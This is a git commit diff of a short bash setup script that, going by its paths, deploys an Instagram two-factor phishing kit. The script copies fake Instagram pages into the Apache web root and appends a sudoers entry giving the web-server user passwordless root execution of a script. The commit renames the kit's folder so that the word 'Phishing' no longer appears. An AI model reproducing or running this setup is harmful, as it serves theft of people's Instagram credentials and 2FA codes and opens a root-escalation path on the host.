e750b3a4bd19b1d014e385af21602fbfd36ad9e1
Alejandro Fernández <alejandrofernandezb92@gmail.com>
2020-01-08 12:41:31 +0100

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 cp -r instagram /var/www/html
 chown -R www-data:www-data /var/www
-echo "www-data ALL=NOPASSWD: /root/2FAInstagramPhishing/root.sh" >> /etc/sudoers
+echo "www-data ALL=NOPASSWD: /root/2FAInstagram/root.sh" >> /etc/sudoers
 service apache2 restart
 echo "The service is running in http://127.0.0.1/instagram/"
